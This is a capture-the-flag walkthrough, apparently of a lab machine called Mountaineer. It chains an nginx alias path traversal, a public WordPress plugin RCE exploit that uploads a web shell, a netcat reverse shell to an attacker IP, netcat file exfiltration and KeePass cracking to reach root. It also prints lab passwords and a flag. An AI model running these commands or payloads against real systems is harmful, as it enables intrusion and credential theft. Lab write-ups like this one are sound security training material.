Let's start by adding `mountaineer.thm` to `/etc/hosts`:

```bash
echo 'IP mountaineer.thm' | sudo tee -a /etc/hosts
```

We can find some users and also the plugin the page is using, this site is using:

```
modern-events-calendar-lite 5.16.2
```

If we search for an exploit regarding this version, we can find this:

![Pasted image 20250722171239.png](../../IMAGES/Pasted%20image%2020250722171239.png)

We got `RCE` on this version, the issue is we need to be authenticated:

![Pasted image 20250722171244.png](../../IMAGES/Pasted%20image%2020250722171244.png)

Let's save the exploit for now in case we get some credentials:

https://www.exploit-db.com/exploits/50082

Let's try to fuzz again to check any hidden stuff that may help us getting credentials:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://mountaineer.thm/wordpress/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

If we try to go to `images`, we get a `403` status code:

![Pasted image 20250722171252.png](../../IMAGES/Pasted%20image%2020250722171252.png)

Analyzing the request on a proxy, we can notice that if we go to `images` instead of `images/`, we get a `301` status code:

![Pasted image 20250722171255.png](../../IMAGES/Pasted%20image%2020250722171255.png)

If we do some research on `nginx` exploitation, we can find there's LFI through misconfigured NGINX alias, we can find this:

![Pasted image 20250722171259.png](../../IMAGES/Pasted%20image%2020250722171259.png)

https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/

We can try `/images../file` to check if LFI exists:

![Pasted image 20250722171303.png](../../IMAGES/Pasted%20image%2020250722171303.png)

LFI indeed exists on this server, let's begin exploitation.


# EXPLOITATION
---

We got LFI and we're working on a `nginx` server, let's build a simple wordlist containing configuration files locations and other files that may help us:

```bash
/etc/nginx/nginx.conf
/etc/nginx/fastcgi_params
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default
/etc/nginx/conf.d/default.conf
/etc/nginx/mime.types
/var/www/html/index.php
/var/www/html/wp-config.php
/var/www/html/.env
/var/www/html/config.php
/var/www/html/db.php
/var/www/html/settings.php
/usr/share/nginx/html/index.html
/usr/share/nginx/html/index.php
/usr/share/nginx/html/wp-config.php
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/php7.4-fpm.log
/var/log/php8.1-fpm.log
/var/log/nginx/default.access.log
/var/log/nginx/default.error.log
/etc/php/7.4/fpm/php.ini
/etc/php/8.1/fpm/php.ini
/etc/php/7.4/fpm/pool.d/www.conf
/etc/php/8.1/fpm/pool.d/www.conf
/var/www/html/.env
/home/everest/.bash_history
/home/everest/.ssh/id_rsa
/home/everest/.ssh/authorized_keys
/etc/mysql/my.cnf
/root/.mysql_history
/etc/crontab
/etc/cron.d/php
/etc/cron.d/root
/var/spool/cron/crontabs/root
/etc/passwd
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/proc/self/environ
/proc/self/status
/proc/self/cmdline
```

After we send the attack, we can see some files get `200` status code:

![Pasted image 20250722171312.png](../../IMAGES/Pasted%20image%2020250722171312.png)


If we check `/etc/nginx/sites-available/default`, we can find this:


![Pasted image 20250722171315.png](../../IMAGES/Pasted%20image%2020250722171315.png)

There's a Vhost on here:

```
adminroundcubemail.mountaineer.thm
```

We can also see the `mysql` configuration file:

![Pasted image 20250722171320.png](../../IMAGES/Pasted%20image%2020250722171320.png)

Unfortunately, we can't access the file through the LFI vulnerability as we get a `403`, let's add the Vhost and check it up:

![Pasted image 20250722171325.png](../../IMAGES/Pasted%20image%2020250722171325.png)


This is running `roundcube webmail 1.5.3`, we know this by checking the source code:

```js
rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10503,
```

![Pasted image 20250722171331.png](../../IMAGES/Pasted%20image%2020250722171331.png)

Nothing too important on here, if we try some basic credentials based on the usernames we found on `wpscan`, we can access the mail with:

```
k2:k2
```


![Pasted image 20250722171336.png](../../IMAGES/Pasted%20image%2020250722171336.png)


We got two emails:

![Pasted image 20250722171341.png](../../IMAGES/Pasted%20image%2020250722171341.png)

![Pasted image 20250722171344.png](../../IMAGES/Pasted%20image%2020250722171344.png)

We've also sent an email:

![Pasted image 20250722171348.png](../../IMAGES/Pasted%20image%2020250722171348.png)

We got a password and some info about `lhotse`, if we try the following credentials on WordPress, we get access to the panel:

```
k2 / th3_tall3st_password_in_th3_world
```


![Pasted image 20250722171356.png](../../IMAGES/Pasted%20image%2020250722171356.png)


![Pasted image 20250722171359.png](../../IMAGES/Pasted%20image%2020250722171359.png)


Credentials work, remember the exploit where we got RCE but we needed authentication?

Time to use it then, let's download the script:

```
https://www.exploit-db.com/download/50082
```

Let's use it:

```python
python3 exploit.py -h

[+] Authentication successfull !

[+] Shell Uploaded to: http://mountaineer.thm:80/wordpress//wp-content/uploads/shell.php
```

Let's go see the shell:

![Pasted image 20250722171405.png](../../IMAGES/Pasted%20image%2020250722171405.png)

We got a `p0wny` shell, let's confirm `rce`:

![Pasted image 20250722171413.png](../../IMAGES/Pasted%20image%2020250722171413.png)

Time to send ourselves a reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc IP 4444 >/tmp/f
```

![Pasted image 20250722171418.png](../../IMAGES/Pasted%20image%2020250722171418.png)

I'll use `pwncat` as my listener to catch persistence in case my listener bugs:

```
pwncat -l --self-inject /bin/bash:10.14.21.28:4444 4444
```

![Pasted image 20250722171422.png](../../IMAGES/Pasted%20image%2020250722171422.png)

Let's begin privilege escalation.

# PRIVILEGE ESCALATION
---

We can make our session better with:

```bash
export TERM=xterm
export BASH=bash
```

Let's use `linpeas` to check any important info:

![Pasted image 20250722171431.png](../../IMAGES/Pasted%20image%2020250722171431.png)

We got a keepass file inside of `lhotse` home, we can also find this:

![Pasted image 20250722171435.png](../../IMAGES/Pasted%20image%2020250722171435.png)

We can't read files inside of `kangchenjunga` home, we can read the `ToDo.txt` file though:

```
www-data@mountaineer:/tmp$ cat /home/nanga/ToDo.txt
cat /home/nanga/ToDo.txt
Just a gentle reminder to myself:

Even though K2 isn't fond of presents, I can't help but want to get him something special! I'll make sure to mark it on my calendar to pick out a little surprise for him by this weekend.

After all, his birthday may be several months away, but every day with him feels like a celebration of love!!!!
```

Python doesn't exist on the machine, we can transfer the file with netcat:

```bash
# On our machine:
nc -lvnp 1111 > backup.kdbx
# On the reverse shell
nc OUR_VPN_IP 1111 < /home/lhotse/Backup.kdbx
```

The file is encrypted with a password:

![Pasted image 20250722171439.png](../../IMAGES/Pasted%20image%2020250722171439.png)

We need to use john to crack it, although, in order to accomplish this, we'll need to craft a custom wordlist containing `lhotse` information, remember the mail we got with his info, we'll use that with `cupp`:

First, let's convert the file into john format with `keepass2john`:

```
keepass2john backup.kdbx > hash
```

Now, its time to use `cupp`, you can clone it from here in case you don't have the tool:

```
git clone https://github.com/Mebus/cupp.git
```

Time to use it:

```python
python3 cupp.py -i

Time to use our wordlist with the hash on john:

```bash
john hash --wordlist=mount.txt

Lhotse56185      (backup)
```

We got the password for our file, let's use it and check the file, we can use `keepassxc`:

![Pasted image 20250722171504.png](../../IMAGES/Pasted%20image%2020250722171504.png)

We can notice kangchenjunga on here, we can now read the password for this user:

![Pasted image 20250722171508.png](../../IMAGES/Pasted%20image%2020250722171508.png)

```
kangchenjunga / J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
```

We can now go into ssh:

![Pasted image 20250722171512.png](../../IMAGES/Pasted%20image%2020250722171512.png)

Time to read those files:

```bash
kangchenjunga@mountaineer:~$ cat local.txt
97a805eb710deb97342a48092876df22

kangchenjunga@mountaineer:~$ cat mynotes.txt
Those my notes:

1. Tell root stop using my account ! It's annoying !
2. Travel to Mars sometime, I heard there are great mountains there !
3. Make my password even harder to crack ! I don't want anyone to hack me !
```

First one is the user flag, what really is interesting here is the `mynotes.txt` file, specially this part:

```bash
1. Tell root stop using my account ! It's annoying !
```

This part hints that we may be able to find root password inside of the `.bash_history` of `kangchenjunga`, let's check:

```bash
kangchenjunga@mountaineer:~$ cat .bash_history
ls
cd /var/www/html
nano index.html
cat /etc/passwd
ps aux
suroot
th3_r00t_of_4LL_mount41NSSSSssssss
whoami
ls -la
cd /root
ls
mkdir test
cd test
touch file1.txt
mv file1.txt ../
cd ..
rm -rf test
exit
ls
cat mynotes.txt
ls
cat .bash_history
cat .bash_history
ls -la
cat .bash_history
exit
bash
exit
```

That's right, we got the root password `th3_r00t_of_4LL_mount41NSSSSssssss`, let's go into root and end the CTF:

```
kangchenjunga@mountaineer:~$ su root
Password:
root@mountaineer:/home/kangchenjunga# whoami
root
```

![Pasted image 20250722171521.png](../../IMAGES/Pasted%20image%2020250722171521.png)

```
